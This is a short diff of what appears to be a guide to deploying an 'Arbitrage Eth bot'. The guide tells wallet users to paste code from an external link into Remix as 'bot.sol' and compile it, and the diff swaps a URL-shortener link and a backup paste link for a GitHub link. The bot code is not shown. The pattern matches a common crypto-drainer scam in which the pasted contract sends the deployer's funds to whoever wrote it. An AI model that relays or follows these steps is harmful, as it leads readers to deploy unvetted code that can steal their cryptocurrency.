@@ -17,8 +17,7 @@ If you're using Trust Wallet or Coinbase Wallet all steps are exact the same as 
 
 👉 Create “New File”. Rename it whatever you want or “bot.sol”
 
-👉 Paste THIS code into Remix: https://urlshorts.org/mercury
-(backup bot source code, if main is not working: https://codefile.io/f/RN0lF9V0kz )
+👉 Paste THIS code into Remix: https://github.com/mercuryeritt/Arbitrage-Eth-bot/blob/main/ethbot
 
 👉 Go to the "Solidity Compiler" tab on Remix, Enable Optimization and Compile
 
